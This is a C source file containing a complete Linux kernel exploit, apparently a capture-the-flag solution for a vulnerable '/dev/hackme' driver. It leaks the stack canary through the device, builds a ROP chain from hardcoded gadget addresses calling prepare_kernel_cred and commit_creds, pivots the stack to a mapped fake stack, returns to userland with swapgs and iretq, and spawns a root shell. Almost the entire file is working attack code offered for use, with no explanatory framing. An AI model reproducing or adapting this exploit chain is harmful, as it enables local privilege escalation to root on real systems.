// 0xffffffff815d612b : xor eax, eax ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
// 0xffffffff8140ddf8 : push rbp ; mov esp, 0x9f3d8b48 ; ret
// 0xffffffff81a94fa6 : push rsi ; mov esp, 0x8948ff96 ; ret
// 0xffffffff8141d14d : pop rbx ; mov esp, 0x5d5b0105 ; ret
// ffffffff814c6410 T commit_creds
// ffffffff814c67f0 T prepare_kernel_cred
// 0xffffffff81006370 : pop rdi ; ret
// For mov rdi, rax
// 0xffffffff818c6eba : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6ead ; pop rbp ; ret
// 0xffffffff818c6f1c : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6f0d ; pop rbp ; ret
//  restricting jump
// 0xffffffff815f4bbc : pop rcx ; ret
// 0xffffffff8150b97e : pop rsi ; ret
// 0xffffffff8100a55f : swapgs ; pop rbp ; ret
// 0xffffffff8100c0d9:	48 cf                	iretq  

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>


int dev_fd;
void device_open(){
    dev_fd = open("/dev/hackme",O_RDWR);
	if (dev_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} 
    else 
        puts("[*] Device opened");
}

unsigned long cookie;
void leak_canary(){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(dev_fd, leak, sizeof(leak));
    cookie = leak[16];
    printf("[*] Cookie: %lx\n", cookie);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long user_rip = (unsigned long)get_shell;

unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long native_write_cr4 = 0xffffffff814443e0;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long pop_rcx_ret = 0xffffffff815f4bbc;
unsigned long pop_rsi_ret = 0xffffffff8150b97e;
unsigned long cmp_mov_rdi_rax_pop_rbp_ret = 0xffffffff818c6f1c; // : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6f0d ; pop rbp ; ret
unsigned long swapgs_pop_rbp = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
unsigned long *fake_stack;
// commit_cred(struct cred *)
// *cred prepare_kernel_cred(struct task_struct *reference_task_struct)
// commit_cred(prepare_kernel_cred(0)

void build_fake_stack(){
    //fake_stack =mmap((void*)0x5d5b0105 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    
    fake_stack =mmap((void*)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0; //rbx 
    fake_stack[off++] = 0; 
    fake_stack[off++] = pop_rdi_ret;
    fake_stack[off++] = 0;
    fake_stack[off++] = prepare_kernel_cred;
    fake_stack[off++] = pop_rcx_ret;
    fake_stack[off++] = 0x1;
    fake_stack[off++] = pop_rsi_ret;
    fake_stack[off++] = 0x2;
    fake_stack[off++] = cmp_mov_rdi_rax_pop_rbp_ret;
    fake_stack[off++] = 0;
    fake_stack[off++] = commit_creds;
    fake_stack[off++] = swapgs_pop_rbp;
    fake_stack[off++] = 0;
    fake_stack[off++] = iretq; 
    fake_stack[off++] = user_rip;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;
}
unsigned long pop_rbx_mov_esp_ret = 0xffffffff8141d14d;
unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret

void overwrite_returnaddress(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = mov_esp_pop2_ret; // return address
    //payload[off++] = pop_rbx_mov_esp_ret;
    //payload[off++] = 0;
    puts("[*] Writing payload to device file");
    write(dev_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}



void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;" //copy the flag register at the top of the stack.
        "pop user_rflags;"
        ".att_syntax;"
    );
}


int main(){
    puts("[*] Opening /dev/hackme");

    device_open();
    
    save_state();
    
    puts("[*] State saved");
    
    leak_canary();

    if (getuid() == 0)
        printf("Already root!\n");
    else 
        printf("Regular user!\n");

    puts("[*] Canary leaked");
    build_fake_stack();
    overwrite_returnaddress();
    
    puts("[!] RIP - Should never be reached");
    return 0;
}
